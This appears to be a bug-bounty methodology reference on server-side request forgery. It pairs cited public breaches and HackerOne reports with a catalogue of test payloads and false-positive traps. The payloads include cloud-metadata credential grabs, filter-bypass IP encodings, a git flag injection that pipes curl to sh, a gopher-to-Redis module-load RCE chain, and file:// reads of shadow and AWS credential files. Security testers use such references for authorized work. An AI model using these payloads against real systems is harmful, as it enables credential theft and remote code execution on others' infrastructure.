# hunt-ssrf — Pattern Library

> Patterns and verifiable public examples behind `hunt-ssrf`. Operator-grade reference, not a complete enumeration. Cited examples are widely-discussed public cases that any reader can search and verify; uncited patterns are general operator knowledge from public bounty disclosures, cloud-security research, and conference talks.

SSRF earns its place at the top of the impact ladder because every modern application sits in a network that has more *internal* services than external ones — cloud metadata services, internal admin APIs, message queues, caches, secret managers. A single "fetch this URL" primitive becomes a pivot into the trust zone behind the WAF. The patterns below cover the IP-bypass arsenal, the protocol-coercion arsenal, the rendering-pipeline subclass, and the OOB discipline that distinguishes real SSRF from URL-echo noise.

## Cited Public Examples

### Capital One SSRF → AWS IMDS → S3 exfil (2019)
- **Source:** US Department of Justice court filings against Paige Thompson, 2019. Widely covered in mainstream technology press, AWS post-mortems, and cloud-security training material.
- **Pattern shape:** A misconfigured web application firewall fronting a Capital One AWS workload permitted SSRF. The attacker reached the EC2 Instance Metadata Service (IMDSv1) at `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`, retrieved temporary IAM credentials for the instance role, and used those credentials to list and download S3 buckets containing ~100 million customer records.
- **Key trick:** No special protocol coercion was needed — the SSRF primitive accepted plain HTTP, and IMDSv1 did not require any header to release credentials. IMDSv2 (with token requirement via `X-aws-ec2-metadata-token`) was designed in response to this class.
- **Why it matters:** Any SSRF on an AWS-hosted target must be tested against IMDSv1, IMDSv2 token-grab, the GCP metadata endpoint, and Azure IMDS variants. The blast radius of "fetch arbitrary URL on the server" is "compromise the cloud role." Always.

### PortSwigger SSRF research and Burp Collaborator workflow
- **Source:** PortSwigger Research, body of work by James Kettle and others. Topics include the SSRF cheat sheet, blind SSRF via OOB techniques, and the integration of Collaborator into the Burp Suite scanning workflow. Searchable at portswigger.net/research; cite the program of research, not a specific URL.
- **Pattern shape:** A general operator methodology — every URL-accepting parameter must be tested with a Collaborator subdomain because in-band signals (errors, status differences, response timing) are not sufficient to claim SSRF. The OOB callback (DNS + HTTP) is what separates SSRF from URL-echo.
- **Key trick:** Sub-tag the Collaborator subdomain per sink (`import.<collab>`, `webhook.<collab>`, `dlsrc.<collab>`) so a single listener can reveal *which* of the dozens of probed parameters fired.
- **Why it matters:** The OOB discipline is the difference between credible SSRF reports and N/A submissions. It's the single most important methodology change for hunters moving from scanner-driven testing to operator-grade work.

### Snyk SSRF → Git config injection → RCE chain
- **Source:** Snyk Security Research blog, multiple posts in 2022-2024 covering the chain from a fetch-arbitrary-URL primitive to a remote-code-execution outcome via clones to attacker-controlled git URLs containing `--upload-pack=` or `--config=` flag-injection-via-URL. Search by topic — the class is publicly documented across Snyk write-ups and corresponding CVEs.
- **Pattern shape:** A CI/CD or build-system endpoint accepts a "repository URL" parameter. The backend invokes `git clone <url>`. A specially crafted URL (e.g. `--upload-pack=curl example.com|sh https://attacker.com/repo.git`) causes `git` to interpret the leading dashes as command-line flags, reaching command execution as the build user.
- **Key trick:** This is SSRF in input *shape* — fetch-from-URL — but the protocol is `git`, not HTTP, and the dangerous primitive is git's own flag parsing, not the network fetch. Operators who only test HTTP-shaped SSRF miss this entirely.
- **Why it matters:** "SSRF" is shorthand for "server-initiated request influenced by attacker input." When the request tool is `git`, `curl`, `wget`, `ffmpeg`, `convert`, or `wkhtmltopdf`, the impact often exceeds plain network fetch — it reaches tool-specific code execution.

### DNS rebinding as a TOCTOU SSRF (longstanding research)
- **Source:** General class first documented in academic security literature decades ago; refreshed by NCC Group, Project Insecurity, and others. Searchable by topic.
- **Pattern shape:** Server validates that a URL's hostname resolves to a public IP, then *re-resolves* the hostname when actually fetching. The attacker controls a DNS server that returns a public IP on the first lookup (passing validation) and `127.0.0.1` or `169.254.169.254` on the second lookup (the actual fetch).
- **Key trick:** Time-Of-Check / Time-Of-Use vulnerability in URL validators that perform DNS resolution. The defense is to resolve once, validate the resolved IP, and *fetch using the validated IP* (or pin to it via `Host:` header).
- **Why it matters:** Any SSRF target with apparent IP-allowlist defense should be tested with a controlled DNS server (`rbndr.us` or custom). A passing allow-list check followed by a successful internal-IP fetch validates DNS rebinding as the primitive.

---

### URL-fetching feature → SSRF (import / preview / attachment)
- **Source:** SSRF via a project-import `remote_attachment_url` (<https://hackerone.com/reports/826361>, $10,000); full-read SSRF via a docs "import as docs" feature (<https://hackerone.com/reports/1409727>, $5,000); partially-blind SSRF via a chat `preview_url` endpoint reaching internal services (<https://hackerone.com/reports/1960765>, $6,000).
- **Pattern shape:** A feature that fetches a user-supplied URL server-side — import-from-URL, link preview/unfurl, remote attachment, avatar-from-URL, webhook tester — is the SSRF workhorse. The server makes the request with its own network position, reaching internal hosts, cloud metadata, or link-local addresses.
- **Key trick:** Inventory every "give us a URL and we'll fetch it" feature. Test internal targets (`http://169.254.169.254/`, `http://localhost:<admin-port>`, internal hostnames) and blind exfil (Collaborator/OOB). Bypass allowlists with redirects, DNS rebinding, and alternate IP encodings.
- **Why it matters:** Highest-frequency SSRF entry point; the import/preview class dominates disclosed SSRF.

### SSRF → cloud metadata / internal control plane → infra compromise
- **Source:** A critical SSRF via an analytics/reporting feature (<https://hackerone.com/reports/2262382>, $25,000); an SSRF that reached the metadata service and led to root access across containers in an infrastructure subset (<https://hackerone.com/reports/341876>).
- **Pattern shape:** The SSRF reaches the cloud instance-metadata endpoint (`169.254.169.254/latest/meta-data/iam/security-credentials/`) and lifts IAM role credentials, or reaches an internal orchestration/admin API. Credentials → lateral movement → root/infra compromise.
- **Key trick:** Once any SSRF is confirmed, always try the metadata endpoint and internal service ports before reporting — the severity (and bounty) jumps an order of magnitude when it yields credentials. On IMDSv2, chain the `PUT` token step.
- **Why it matters:** Turns a "server made a request" finding into full infrastructure takeover.

### Protocol / proxy SSRF (TURN, gopher, non-HTTP)
- **Source:** A TURN server permitted TCP/UDP proxying to the internal network and AWS metadata (<https://hackerone.com/reports/333419>, $3,500).
- **Pattern shape:** A non-HTTP relay (TURN/STUN for WebRTC, an open proxy, a gopher/dict-capable fetcher) forwards attacker traffic to arbitrary internal hosts/ports — a broader SSRF than HTTP-only, reaching databases and metadata over raw TCP/UDP.
- **Key trick:** For real-time/media features, test whether the TURN/STUN relay accepts arbitrary peer addresses (internal IPs, metadata). For HTTP fetchers, probe `gopher://`/`dict://` to reach non-HTTP internal services.
- **Why it matters:** Escapes the "HTTP-only SSRF" mental model; reaches services an HTTP fetch can't.

### Further disclosed reports (this class)

Additional high-signal public disclosures exemplifying the patterns above; read at source for full technique.

- <https://hackerone.com/reports/746024> — $4500
- <https://hackerone.com/reports/2429894> — $4860
- <https://hackerone.com/reports/671935> — $4000
- <https://hackerone.com/reports/374737> — $3500
- <https://hackerone.com/reports/892049> — $3000
- <https://hackerone.com/reports/1062888> — $2727
- <https://hackerone.com/reports/530974> — $0
- <https://hackerone.com/reports/2301565> — $2500
- <https://hackerone.com/reports/632101> — $0
- <https://hackerone.com/reports/590020> — $0
- <https://hackerone.com/reports/3176157> — $2000
- <https://hackerone.com/reports/549882> — $0
- <https://hackerone.com/reports/1189367> — $0
- <https://hackerone.com/reports/826097> — $1000
- <https://hackerone.com/reports/265050> — $1500
- <https://hackerone.com/reports/347139> — $1500
- <https://hackerone.com/reports/878779> — $0
- <https://hackerone.com/reports/2035332> — $500
- <https://hackerone.com/reports/508459> — $0
- <https://hackerone.com/reports/811136> — $1000
- <https://hackerone.com/reports/707014> — $1350
- <https://hackerone.com/reports/429617> — $1000
- <https://hackerone.com/reports/1719719> — $1000
- <https://hackerone.com/reports/398641> — $0
- <https://hackerone.com/reports/644238> — $0
- <https://hackerone.com/reports/3024673> — $0
- <https://hackerone.com/reports/305974> — $1000
- <https://hackerone.com/reports/1624140> — $1000

## Pattern Library

### Direct internal-IP fetch (no validation)
- **When to suspect:** A URL parameter on an integration / preview / webhook / import endpoint. No visible URL filter.
- **Test:** Set the URL to `http://<collab>/x`. After confirming Collaborator interaction, test `http://127.0.0.1/`, `http://169.254.169.254/latest/meta-data/`, `http://169.254.169.254/computeMetadata/v1/?recursive=true&alt=json` (GCP, with header `Metadata-Flavor: Google` if supported by the SSRF primitive), `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (Azure, with header `Metadata: true`).
- **Validation:** Collaborator interaction confirms outbound fetch; metadata response in body or via OOB callback confirms reach.
- **Pay-grade rationale:** Critical when cloud metadata is reachable; high otherwise.

### IP-encoding bypass arsenal
- **When to suspect:** Filter rejects `127.0.0.1` or `169.254.169.254` literally.
- **Test:** Iterate alternative encodings:
  - Decimal: `2130706433` (= 127.0.0.1), `2852039166` (= 169.254.169.254).
  - Octal: `0177.0.0.1`, `0251.0376.0251.0376`.
  - Hex: `0x7f000001`, `0xa9fea9fe`.
  - Short-form: `127.1`, `0.0.0.0`, `0`.
  - IPv6 mapping: `[::ffff:127.0.0.1]`, `[::ffff:7f00:0001]`, `[0:0:0:0:0:ffff:127.0.0.1]`.
  - Mixed encoding: `0x7f.1`, `127.0x00.0.0x01`.
- **Validation:** Internal fetch succeeds despite filter.
- **Pay-grade rationale:** Critical when metadata is reachable behind the bypass.

### DNS rebinding (TOCTOU on validation)
- **When to suspect:** Filter resolves the hostname, validates the IP is public, then fetches by hostname (not by IP).
- **Test:** Use a controlled DNS service to return `1.2.3.4` (passing public-IP check) then `169.254.169.254` on the next query. Aim the validator at the hostname.
- **Validation:** Validator approves, fetch reaches metadata, response body contains IAM credentials or instance metadata.
- **Pay-grade rationale:** Critical.

### Redirect-chain SSRF
- **When to suspect:** Filter checks the *initial* URL only; the HTTP client follows redirects without re-validating.
- **Test:** Host `https://attacker.tld/redirect.php` that returns `Location: http://169.254.169.254/latest/meta-data/`. Set the SSRF parameter to your attacker URL.
- **Validation:** Server fetches your URL (Collaborator HTTP interaction), then follows the redirect to the metadata endpoint, returns metadata content in the response or to OOB.
- **Pay-grade rationale:** Critical when chained to metadata; high otherwise.

### Gopher protocol smuggling to internal Redis / Memcached / SMTP
- **When to suspect:** Backend uses `curl`-like fetch (libcurl supports gopher, file, dict by default). Internal Redis or Memcached on a known port.
- **Test:** `gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A` to flush Redis as a probe; escalate to `CONFIG SET dir /var/lib/redis-write`, `CONFIG SET dbfilename shell.so`, `MODULE LOAD /var/lib/redis-write/shell.so` for RCE in some Redis configurations. SMTP: `gopher://127.0.0.1:25/_HELO%20a%0D%0AMAIL...`.
- **Validation:** Server-side state change (Redis key set, SMTP message sent), or OOB callback from a payload that exfiltrates internal data.
- **Pay-grade rationale:** Critical. Gopher SSRF on Redis is a textbook RCE chain.

### File protocol (local file read via SSRF)
- **When to suspect:** Same backend fetch tool. `file://` URI permitted.
- **Test:** `file:///etc/passwd`, `file:///proc/self/environ`, `file:///proc/self/cmdline`, `file:///etc/shadow` (rarely readable but worth probing), `file:///root/.aws/credentials`.
- **Validation:** File contents in response body or OOB.
- **Pay-grade rationale:** High when sensitive files are reachable.

### Blind SSRF via webhooks
- **When to suspect:** Application accepts user-configurable webhook URLs (notifications, integration events, "send updates to this URL").
- **Test:** Configure the webhook to a Collaborator subdomain, trigger an event, await OOB.
- **Validation:** Collaborator interaction from the target's source IP.
- **Pay-grade rationale:** Low standalone (legitimate feature); high when chained to internal-network probing via crafted webhook URLs after initial OOB confirmation.

### SSRF via PDF / screenshot rendering
- **When to suspect:** Application generates PDFs or screenshots from HTML — invoice generation, report export, social-card preview. Backend is wkhtmltopdf, headless Chrome, or weasyprint.
- **Test:** Inject `<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/...">` or `<iframe src="file:///etc/passwd">` into the HTML the renderer processes. Some renderers historically allowed `file://` from rendered HTML.
- **Validation:** Rendered output contains the fetched content, or OOB callback from the rendering server.
- **Pay-grade rationale:** High to critical.

### SSRF via XML / SVG (XXE-adjacent)
- **When to suspect:** Endpoint accepts XML or SVG and parses it server-side.
- **Test:** External entity `<!ENTITY xxe SYSTEM "http://<collab>/x">` referenced in the document. Or SVG `<image href="http://169.254.169.254/...">` rendered server-side.
- **Validation:** OOB interaction or entity content in the response.
- **Pay-grade rationale:** High. Crosses with `hunt-xxe`.

### URL-parser confusion
- **When to suspect:** Server uses one URL parser to validate (e.g., Python's `urllib.parse`), another to fetch (e.g., `requests`). The two parsers handle malformed URLs differently.
- **Test:** Payloads like `http://allowed.tld#@169.254.169.254/`, `http://allowed.tld\@169.254.169.254/`, `http://169.254.169.254/?@allowed.tld`, `http://allowed.tld:80@169.254.169.254/`. Each exploits a discrepancy in how `userinfo` / `host` / `fragment` are parsed.
- **Validation:** Validator approves on `allowed.tld`, fetcher requests `169.254.169.254`.
- **Pay-grade rationale:** Critical.

### IPv6 / dual-stack confusion
- **When to suspect:** Validator only checks IPv4 ranges; backend resolves and connects via IPv6.
- **Test:** `[::1]`, `[::ffff:127.0.0.1]`, `[fd00::1]`, link-local IPv6 `[fe80::1%eth0]`.
- **Validation:** Internal IPv6 service reached.
- **Pay-grade rationale:** High.

### `0.0.0.0` and short-form quirks
- **When to suspect:** Filter blocks `127.0.0.1` but not `0.0.0.0`.
- **Test:** `http://0.0.0.0/`, `http://0/`, `http://127.1/`. On many Linux servers, `0.0.0.0` routes to localhost.
- **Validation:** Localhost service reached.
- **Pay-grade rationale:** High when localhost services are present.

### SSRF via second-order URL
- **When to suspect:** Application stores a URL in profile / settings; later, a different code path fetches that URL (avatar update, link-preview cron job).
- **Test:** Store a Collaborator URL in the profile field; trigger or wait for the second-order fetch.
- **Validation:** Delayed OOB callback, after the second-order job runs.
- **Pay-grade rationale:** High. The delay defeats most scanners.

### Cloud metadata via specific cloud headers / paths
- **When to suspect:** SSRF reaches some endpoint but cloud-metadata service requires specific headers.
- **Test:** GCP requires `Metadata-Flavor: Google` — if the SSRF primitive lets you set arbitrary headers (rare) or you're sending via a coercive protocol that includes the header, test directly. Azure requires `Metadata: true`. AWS IMDSv2 requires a PUT to acquire a token, then GET with `X-aws-ec2-metadata-token: <token>`. If the SSRF primitive only supports GET, IMDSv1 may still be reachable on legacy hosts.
- **Validation:** Metadata in response or OOB.
- **Pay-grade rationale:** Critical.

### Internal admin / management API discovery
- **When to suspect:** SSRF confirmed; metadata not reachable; target runs Kubernetes / Docker / orchestration.
- **Test:** Probe `http://kubernetes.default.svc/api/v1/`, `http://localhost:10250/pods/`, `http://localhost:8001/api/`, internal admin ports (8500 Consul, 8080 Spring Boot Actuator, 9200 Elasticsearch, 5984 CouchDB, 27017 MongoDB).
- **Validation:** Service banner / admin API response.
- **Pay-grade rationale:** Critical when reaches an admin endpoint with privileged operations.

---

## Anti-Patterns (FP traps)

### URL echo in error message
- **Looks like:** Server returns 500 with body `"Could not fetch http://attacker.tld/x"`.
- **Actually is:** String formatting in an error template. The server may never have made an outbound request — the URL is just being printed back to you in the error.
- **How to disprove:** Plant a Burp Collaborator subdomain in the URL and wait 30–120 seconds. Zero DNS or HTTP interactions = no fetch happened, even with the echo. This is the canonical FP-trap in SSRF hunting. Lesson reference (authorized SharePoint engagement): SharePoint `/_layouts/15/download.aspx?SourceUrl=` echoed every URL into the error title; 38 Collaborator-tagged payloads across 12+ parameters yielded zero interactions. The "echo" was client-side formatting; the server resolved a SharePoint-internal SPFile path, not an outbound URL.

### 500 with stack trace mentioning your URL
- **Looks like:** Stack trace in response shows `java.net.MalformedURLException: http://attacker.tld/x at ...`. Looks like the server tried to fetch and failed.
- **Actually is:** The exception was thrown by a parser, not a network library. The trace shows that the URL was *parsed* (and rejected) — not *fetched*.
- **How to disprove:** OOB-or-it-didn't-happen. Plant a syntactically valid Collaborator URL. If still no callback, the code path never reaches a network call.

### Client-side fetch claimed as SSRF
- **Looks like:** Page fetches a URL via JavaScript, you find a way to inject a URL, browser dev tools show the fetch.
- **Actually is:** Client-side fetches happen in the *victim's browser*. They are not server-side requests; they are subject to CORS and same-origin policy; they cannot reach the server's internal network.
- **How to disprove:** Confirm the request source IP is the server, not the victim's browser. If the request shows browser User-Agent and originates from the victim's IP, it's a CSRF / XSS chain, not SSRF.

### Response timing differences claimed as blind SSRF
- **Looks like:** Sending an external URL returns in 200ms; sending `127.0.0.1:22` returns in 5 seconds. Looks like the server attempted a connection to localhost and timed out.
- **Actually is:** Timing differences can come from DNS resolution alone, from URL-parser branching, from validator-side network probes that don't actually fetch, or from rate limiting.
- **How to disprove:** Plant Collaborator. If no DNS interaction, no fetch happened — the timing is from something earlier in the pipeline. Report a timing oracle as a side-channel only when chained to a real impact.
